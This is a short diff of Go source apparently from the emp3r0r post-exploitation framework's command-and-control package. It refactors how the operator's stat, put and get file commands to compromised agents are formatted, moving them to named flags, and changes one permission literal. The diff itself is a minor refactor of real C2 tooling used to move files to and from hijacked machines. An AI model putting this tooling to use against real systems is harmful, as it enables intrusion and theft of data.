@@ -3,7 +3,6 @@
 
 package cc
 
-
 import (
 	"encoding/json"
 	"fmt"
@@ -19,7 +18,7 @@ import (
 // StatFile Get stat info of a file on agent
 func StatFile(filepath string, a *emp3r0r_data.AgentSystemInfo) (fi *util.FileStat, err error) {
 	cmd_id := uuid.NewString()
-	cmd := fmt.Sprintf("%s '%s'", emp3r0r_data.C2CmdStat, filepath)
+	cmd := fmt.Sprintf("%s --path '%s'", emp3r0r_data.C2CmdStat, filepath)
 	err = SendCmd(cmd, cmd_id, a)
 	if err != nil {
 		return
@@ -74,7 +73,7 @@ func PutFile(lpath, rpath string, a *emp3r0r_data.AgentSystemInfo) error {
 	}
 
 	// send cmd
-	cmd := fmt.Sprintf("put '%s' '%s' %d", lpath, rpath, size)
+	cmd := fmt.Sprintf("put --file '%s' --path '%s' --size %d", lpath, rpath, size)
 	err = SendCmd(cmd, "", a)
 	if err != nil {
 		return fmt.Errorf("PutFile send command: %v", err)
@@ -86,7 +85,7 @@ func PutFile(lpath, rpath string, a *emp3r0r_data.AgentSystemInfo) error {
 // GetFile get file from agent
 func GetFile(filepath string, a *emp3r0r_data.AgentSystemInfo) error {
 	if !util.IsExist(FileGetDir) {
-		err := os.MkdirAll(FileGetDir, 0700)
+		err := os.MkdirAll(FileGetDir, 0o700)
 		if err != nil {
 			return fmt.Errorf("GetFile mkdir %s: %v", FileGetDir, err)
 		}
@@ -135,7 +134,7 @@ func GetFile(filepath string, a *emp3r0r_data.AgentSystemInfo) error {
 	ftpSh.H2x = new(emp3r0r_data.H2Conn)
 
 	// cmd
-	cmd := fmt.Sprintf("#get '%s' %d '%s'", filepath, offset, ftpSh.Token)
+	cmd := fmt.Sprintf("get --filepath '%s' --offset %d --token '%s'", filepath, offset, ftpSh.Token)
 	err = SendCmd(cmd, "", a)
 	if err != nil {
 		CliPrintError("GetFile send command: %v", err)
